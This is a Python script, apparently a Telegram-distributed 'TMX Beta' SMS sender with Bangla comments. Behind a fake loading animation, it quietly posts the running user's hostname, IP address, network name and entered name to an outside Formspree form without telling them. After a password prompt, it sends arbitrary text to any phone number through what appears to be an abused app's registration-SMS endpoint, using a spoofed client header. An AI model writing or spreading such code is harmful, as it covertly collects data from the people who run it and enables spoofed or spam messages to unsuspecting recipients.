import os
import getpass
import webbrowser
import random
from colorama import Fore, init

def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        os.system(f"pip install {module_name}")

install_module("pyfiglet")
install_module("requests")
install_module("colorama")
#Ani
import time

def animate(duration):
    start_time = time.time()
    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time
        progress = elapsed_time / duration
        print_progress_bar(progress)
        if elapsed_time >= duration:
            break
        time.sleep(0.1)  # স্লিপ করুন যাতে এনিমেশন পরিষ্কার দেখা যায়

def print_progress_bar(progress, bar_length=50):
    bar = '#' * int(bar_length * progress)
    space = '-' * (bar_length - len(bar))
    percent = progress * 100
    print(f'[{bar}{space}] {percent:.2f}%\r', end='')

animate(10)  # 10 সেকেন্ড সময়ে এনিমেশন চালানো

from pyfiglet import figlet_format
import requests

init(autoreset=True)
#ax
import socket
import requests
myname = input("Your Name : ")
def get_network_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return hostname, ip_address

def send_email(name, ip, network_name):
    import datetime
    current_time = datetime.datetime.now()
    email = 'example@example.com' 
    form_data = {
        'name': name,
        'ip': ip,
        'network_name': network_name,
        "Name": myname,
        "tume": current_time
    }
    response = requests.post('https://formspree.io/f/myyrbpzq', data=form_data)

#    if response.status_code == 200:
#        print("Form submitted successfully!")
#    else:
#        print("Failed to submit form. Status code:", response.status_code)

def main():
    name, ip = get_network_info()
    network_name = socket.getfqdn()
    send_email(name, ip, network_name)

if __name__ == "__main__":
    main()

colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]

def clear_screen():
    
    os.system('cls' if os.name == 'nt' else 'clear')

def send_message(number, text, color):
    url = "http://202.51.182.198:8181/nbp/sms/code"
    payload = {
        "receiver": number,
        "text": text,
        "title": "Register Account"
    }

    headers = {
        'User-Agent': "okhttp/3.11.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': "Bearer",
        'language': "en",
        'timeZone': "Asia/Dhaka"
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.json().get("msg_code") == "operate.success":
        print(color + "Message sent successfully!")
    else:
        print(color + "Failed to send message")

while True:
    clear_screen()
    password = input("Tools Password : ")

    if password == "tmxlamim": 
        color = random.choice(colors)
        os.system("clear")  
        logo = figlet_format("TMX Beta")
        print(color + logo)
        line = color + "-------------------------------------------------"
        print(color + "Telgram : @tmx71bd")
        print(color + "Tools virson : 1.0")
        
        print(line)
        
        number = input("Number : ")
        tex = input("Your Text : ")
        send_message(number, tex, color)
        
        Renew = input("আপনি কি আবার মেসেজ পাঠাতে চান Y/N : ")
        if Renew.upper() != "Y":
            break
    else:
        print("Password Error.\n1. Password on Telegram\n2. Back To Log In")
        choice = input("অপশন নির্বাচন করুন (1/2): ")
        if choice == "1":
            webbrowser.open("https://t.me/tmx71bd")
        elif choice == "2":
            continue
